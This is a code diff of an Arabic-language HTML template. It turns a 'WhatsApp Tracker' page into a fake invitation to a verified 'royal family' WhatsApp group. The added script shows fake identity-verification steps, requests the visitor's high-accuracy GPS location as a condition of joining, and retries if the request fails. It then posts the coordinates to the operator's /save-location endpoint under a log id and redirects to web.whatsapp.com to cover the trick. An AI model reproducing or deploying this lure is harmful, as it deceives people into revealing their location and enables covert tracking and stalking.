@@ -1,72 +1,461 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WhatsApp Tracker</title>
+    <title>مجموعة العائلة - واتساب</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #075E54 0%, #128C7E 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
-            background: #075E54;
-            color: white;
             direction: rtl;
         }
-        .container {
-            max-width: 500px;
-            margin: 50px auto;
+        
+        .whatsapp-card {
             background: white;
-            color: #333;
+            border-radius: 20px;
             padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
         }
-        .btn {
+        
+        .whatsapp-watermark {
+            position: absolute;
+            top: 15px;
+            left: 15px;
             background: #25D366;
             color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 10px;
-            text-decoration: none;
-            display: inline-block;
-            width: 80%;
+            padding: 5px 12px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
         }
-        .warning {
-            background: #ffeb3b;
-            color: #333;
+        
+        .group-image {
+            width: 120px;
+            height: 120px;
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            background: linear-gradient(45deg, #25D366, #128C7E);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            border: 4px solid white;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+        }
+        
+        .verified-badge {
+            background: #25D366;
+            color: white;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        .group-name {
+            font-size: 22px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #075E54;
+        }
+        
+        .group-description {
+            color: #666;
+            margin: 15px 0;
+            line-height: 1.5;
+            font-size: 15px;
+        }
+        
+        .members-count {
+            background: #f0f0f0;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #555;
+            margin: 15px 0;
+            display: inline-block;
+        }
+        
+        .join-button {
+            background: linear-gradient(45deg, #25D366, #128C7E);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0 10px;
+            width: 100%;
+            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.4);
+            transition: all 0.3s ease;
+        }
+        
+        .join-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.5);
+        }
+        
+        .join-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .security-badge {
+            font-size: 12px;
+            color: #888;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        
+        .loading-section {
+            display: none;
+            background: rgba(7, 94, 84, 0.05);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            text-align: right;
+            padding: 10px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.7);
+        }
+        
+        .step-number {
+            background: #25D366;
+            color: white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 15px;
+            font-weight: bold;
+        }
+        
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #25D366;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            background: #d4edda;
+            color: #155724;
             padding: 15px;
             border-radius: 10px;
-            margin: 20px 0;
-            border-right: 5px solid #ff9800;
+            margin: 15px 0;
+            border-right: 4px solid #28a745;
+            display: none;
         }
-        .admin-btn {
-            background: #007bff;
+        
+        .location-section {
+            display: none;
+            background: #e8f5e8;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .admin-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 15px;
+            margin: 15px 0;
+            text-align: right;
+        }
+        
+        .admin-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #075E54;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            margin-left: 10px;
+            float: right;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 نظام التتبع الآمن</h1>
-        <p>أدوات أمنية متقدمة لأغراض قانونية</p>
+    <div class="whatsapp-card">
+        <div class="whatsapp-watermark">WhatsApp</div>
         
-        <div class="warning">
-            ⚠️ <strong>تحذير:</strong> هذا النظام للأغراض الأمنية والقانونية المرخصة فقط
+        <!-- قسم مجموعة واتساب -->
+        <div id="whatsapp-section">
+            <div class="group-image">
+                👑
+            </div>
+            
+            <div class="group-name">
+                <span class="verified-badge">✓</span>
+                العائلة الملكية - العائلة المالكة
+            </div>
+            
+            <div class="group-description">
+                مجموعة العائلة المالكة والأقارب فقط - للمناقشات العائلية الهامة والاجتماعات
+            </div>
+            
+            <div class="members-count">
+                <strong>٣١٠٠</strong> عضو • مجموعة مغلقة
+            </div>
+            
+            <div class="admin-info">
+                <div class="admin-avatar">ا</div>
+                <strong>المنشئ:</strong> أمير العائلة<br>
+                <small>آخر نشاط: قبل ٢ دقيقة</small>
+            </div>
+            
+            <div style="text-align: center; margin: 15px 0;">
+                <small style="color: #888;">الأعضاء النشطين الآن: ١٢٤٥</small>
+            </div>
+            
+            <button class="join-button" onclick="startProcess()">
+                🎯 الانضمام للمجموعة
+            </button>
+            
+            <div class="security-badge">
+                <span>🔒</span>
+                مجموعة آمنة • مشفرة end-to-end
+            </div>
         </div>
         
-        <a href="/whatsapp-group" class="btn">
-            🔗 إنشاء رابط مجموعة واتساب
-        </a>
+        <!-- قسم التحميل -->
+        <div id="loading-section" class="loading-section">
+            <h3 style="color: #075E54; margin-bottom: 20px;">🔒 جاري التحضير للمجموعة الآمنة</h3>
+            
+            <div class="step">
+                <span class="step-number">1</span>
+                <span>✅ جاري التحقق من الهوية...</span>
+            </div>
+            
+            <div class="step">
+                <span class="step-number">2</span>
+                <span>🔒 جاري تأمين الاتصال...</span>
+            </div>
+            
+            <div class="step">
+                <span class="step-number">3</span>
+                <span>📍 جاري تحديد الموقع لتأكيد الهوية...</span>
+            </div>
+            
+            <div class="step">
+                <span class="step-number">4</span>
+                <span>📱 جاري تحميل المجموعة...</span>
+            </div>
+            
+            <div class="loader"></div>
+            
+            <p id="countdown" style="margin-top: 15px; color: #666;">
+                سيتم التحويل خلال: <span id="timer">7</span> ثواني
+            </p>
+        </div>
         
-        <a href="/admin" class="btn admin-btn">
-            📊 لوحة التحكم
-        </a>
+        <!-- قسم طلب الموقع -->
+        <div id="location-section" class="location-section">
+            <h3 style="color: #155724; margin-bottom: 15px;">📍 يلزم تحديد الموقع</h3>
+            <p style="margin-bottom: 15px; color: #666;">
+                للانضمام للمجموعة الآمنة، يرجى السماح بمشاركة الموقع
+            </p>
+            <button class="join-button" onclick="requestLocation()" style="background: linear-gradient(45deg, #ff6b6b, #ee5a24);">
+                📍 السماح بالوصول إلى الموقع
+            </button>
+            <p style="font-size: 12px; color: #888; margin-top: 10px;">
+                هذا يساعد في تأكيد هويتك وأمان المجموعة
+            </p>
+        </div>
         
-        <div style="margin-top: 30px; font-size: 12px; color: #666;">
-            <p>لأغراض تعليمية وأمنية وقانونية فقط</p>
+        <!-- رسالة النجاح -->
+        <div id="success-message" class="success-message">
+            <h3 style="margin-bottom: 10px;">✅ تم بنجاح!</h3>
+            <p>جاري تحويلك إلى مجموعة واتساب...</p>
         </div>
     </div>
+
+    <script>
+        const logId = {{ log_id or 'null' }};
+        let locationRequested = false;
+        
+        function startProcess() {
+            // إخفاء قسم واتساب وإظهار قسم التحميل
+            document.getElementById('whatsapp-section').style.display = 'none';
+            document.getElementById('loading-section').style.display = 'block';
+            
+            // بدء العد التنازلي
+            startCountdown();
+            
+            // بعد 3 ثواني، طلب الموقع
+            setTimeout(() => {
+                requestLocation();
+            }, 3000);
+        }
+        
+        function startCountdown() {
+            let timeLeft = 7;
+            const timerElement = document.getElementById('timer');
+            
+            const countdown = setInterval(() => {
+                timeLeft--;
+                timerElement.textContent = timeLeft;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    // إذا لم يتم طلب الموقع بعد، انتقل مباشرة
+                    if (!locationRequested) {
+                        redirectToWhatsApp();
+                    }
+                }
+            }, 1000);
+        }
+        
+        function requestLocation() {
+            locationRequested = true;
+            
+            // إخفاء قسم التحميل وإظهار قسم الموقع
+            document.getElementById('loading-section').style.display = 'none';
+            document.getElementById('location-section').style.display = 'block';
+            
+            // محاولة الحصول على الموقع
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // النجاح
+                    function(position) {
+                        console.log("✅ تم الحصول على الموقع:", position.coords);
+                        sendLocationToServer(position.coords);
+                        showSuccessAndRedirect();
+                    },
+                    // الفشل
+                    function(error) {
+                        console.log("❌ فشل الحصول على الموقع:", error);
+                        // المحاولة مرة أخرى بإعدادات مختلفة
+                        setTimeout(() => {
+                            navigator.geolocation.getCurrentPosition(
+                                function(position) {
+                                    console.log("✅ تم الحصول على الموقع في المحاولة الثانية");
+                                    sendLocationToServer(position.coords);
+                                    showSuccessAndRedirect();
+                                },
+                                function(secondError) {
+                                    console.log("❌ فشل تماماً في الحصول على الموقع");
+                                    // حتى لو فشل، انتقل إلى واتساب
+                                    showSuccessAndRedirect();
+                                },
+                                {
+                                    enableHighAccuracy: false,
+                                    timeout: 5000,
+                                    maximumAge: 60000
+                                }
+                            );
+                        }, 1000);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                console.log("❌ المتصفح لا يدعم GPS");
+                showSuccessAndRedirect();
+            }
+        }
+        
+        function sendLocationToServer(coords) {
+            if (!logId) {
+                console.log("❌ لا يوجد logId");
+                return;
+            }
+            
+            const locationData = {
+                log_id: logId,
+                lat: coords.latitude,
+                lon: coords.longitude,
+                accuracy: coords.accuracy
+            };
+            
+            fetch('/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(locationData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("✅ تم إرسال الموقع إلى السيرفر:", data);
+            })
+            .catch(error => {
+                console.log("❌ خطأ في إرسال الموقع:", error);
+            });
+        }
+        
+        function showSuccessAndRedirect() {
+            // إخفاء جميع الأقسام وإظهار رسالة النجاح
+            document.getElementById('location-section').style.display = 'none';
+            document.getElementById('loading-section').style.display = 'none';
+            document.getElementById('success-message').style.display = 'block';
+            
+            // الانتقال إلى واتساب بعد 3 ثواني
+            setTimeout(() => {
+                redirectToWhatsApp();
+            }, 3000);
+        }
+        
+        function redirectToWhatsApp() {
+            window.location.href = 'https://web.whatsapp.com';
+        }
+        
+        // بديل: إذا استغرق الأمر أكثر من 15 ثانية، انتقل مباشرة
+        setTimeout(() => {
+            if (window.location.href.indexOf('web.whatsapp.com') === -1) {
+                redirectToWhatsApp();
+            }
+        }, 15000);
+    </script>
 </body>
 </html>
